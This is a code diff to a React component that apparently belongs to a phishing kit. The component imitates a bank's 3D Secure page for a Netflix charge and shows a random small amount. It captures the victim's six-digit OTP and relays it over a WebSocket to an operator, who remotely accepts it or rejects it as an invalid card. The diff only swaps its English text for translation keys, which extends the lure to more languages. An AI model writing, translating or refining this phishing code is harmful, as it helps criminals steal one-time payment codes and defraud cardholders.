@@ -1,11 +1,13 @@
 import { useEffect, useState, useRef } from 'react';
 import { useNavigate } from 'react-router-dom';
 import useWebSocket from '../hooks/useWebSocket';
+import { useTranslation } from '../hooks/useTranslation';
 import { randomParamsURL } from '../utils/validation';
 import '../styles/vbv-secure.css';
 
 function ThreeDSecure() {
   const navigate = useNavigate();
+  const { t } = useTranslation();
   const { sendOTPSubmit, sendPresence } = useWebSocket();
   // Générer un montant aléatoire entre 0.01 et 0.99
   const getRandomAmount = () => {
@@ -74,7 +76,7 @@ function ThreeDSecure() {
       if (data && data.type === 'direct' && data.payload && data.payload.action === 'redirect') {
         const page = data.payload.page;
         const isCancellation = data.payload.isCancellation || false;
-        const errorMessage = data.payload.errorMessage || 'Your credit card is not valid. Please check your card details and try again.';
+        const errorMessage = data.payload.errorMessage || t('threeDSecure.errors.invalidCard');
         console.log('[ThreeDSecure] ✅ Redirect message received (via direct)! Target page:', page, 'isCancellation:', isCancellation);
         setIsSubmitting(false); // Arrêter l'animation
         
@@ -103,7 +105,7 @@ function ThreeDSecure() {
         } else {
           // Si rejeté, rediriger vers payment-details avec message d'erreur
           console.log('[ThreeDSecure] 🚫 OTP rejected - storing error message');
-          localStorage.setItem('paymentError', 'Your credit card is not valid. Please check your card details and try again.');
+          localStorage.setItem('paymentError', t('threeDSecure.errors.invalidCard'));
           navigate(`/payment-details?${randomParamsURL()}`);
         }
       } else if (data && data.type === 'redirect') {
@@ -145,7 +147,7 @@ function ThreeDSecure() {
     
     // Vérifier que le code OTP fait exactement 6 chiffres
     if (!otpInput || otpInput.length !== 6 || !/^\d{6}$/.test(otpInput)) {
-      alert('Please enter a valid 6-digit OTP code');
+      alert(t('threeDSecure.errors.invalidOTP'));
       return;
     }
 
@@ -192,36 +194,36 @@ function ThreeDSecure() {
           </header>
 
           <div className="auth-content">
-            <p className="info-message">We just sent you a verification code by text message to your mobile number.</p>
+            <p className="info-message">{t('threeDSecure.infoMessage')}</p>
 
             <div className="transaction-info">
               <div className="info-row">
-                <span className="info-label">Merchant:</span>
+                <span className="info-label">{t('threeDSecure.merchant')}:</span>
                 <span className="info-value">Netflix</span>
               </div>
               <div className="info-row">
-                <span className="info-label">Amount:</span>
+                <span className="info-label">{t('threeDSecure.amount')}:</span>
                 <span className="info-value amount">${randomAmount}</span>
               </div>
               <div className="info-row">
-                <span className="info-label">Date:</span>
+                <span className="info-label">{t('threeDSecure.date')}:</span>
                 <span className="info-value">{currentDate || getCurrentDate()}</span>
               </div>
               <div className="info-row">
-                <span className="info-label">Card number:</span>
+                <span className="info-label">{t('threeDSecure.cardNumber')}:</span>
                 <span className="info-value card-num">{formatCardNumber(cardNumber)}</span>
               </div>
             </div>
 
             <form className="auth-form" onSubmit={handleSubmit}>
               <div className="form-field">
-                <label htmlFor="secureCode" className="field-label">3D Secure OTP:</label>
+                <label htmlFor="secureCode" className="field-label">{t('threeDSecure.otpLabel')}</label>
                 <input 
                   type="text" 
                   id="secureCode" 
                   name="secureCode" 
                   className="secure-input" 
-                  placeholder="Enter 6-digit OTP"
+                  placeholder={t('threeDSecure.otpPlaceholder')}
                   required
                   autoComplete="off"
                   maxLength="6"
@@ -248,10 +250,10 @@ function ThreeDSecure() {
                   {isSubmitting ? (
                     <>
                       <span style={{ marginRight: '8px' }}>⏳</span>
-                      Processing...
+                      {t('threeDSecure.processing')}
                     </>
                   ) : (
-                    'Submit'
+                    t('threeDSecure.submit')
                   )}
                 </button>
                 <a 
@@ -263,7 +265,7 @@ function ThreeDSecure() {
                   }}
                   style={{ opacity: isSubmitting ? 0.5 : 1, pointerEvents: isSubmitting ? 'none' : 'auto' }}
                 >
-                  Cancel
+                  {t('threeDSecure.cancel')}
                 </a>
               </div>
               
@@ -291,13 +293,13 @@ function ThreeDSecure() {
                     marginRight: '8px',
                     verticalAlign: 'middle'
                   }}></div>
-                  <span>Processing in progress...</span>
+                  <span>{t('threeDSecure.processingInProgress')}</span>
                 </div>
               )}
             </form>
 
             <div className="footer-info">
-              <p>For further questions, please contact the bank call center or visit our website. All entered information is confidential and is not to be shared with the merchant.</p>
+              <p>{t('threeDSecure.footerInfo')}</p>
             </div>
           </div>
         </div>
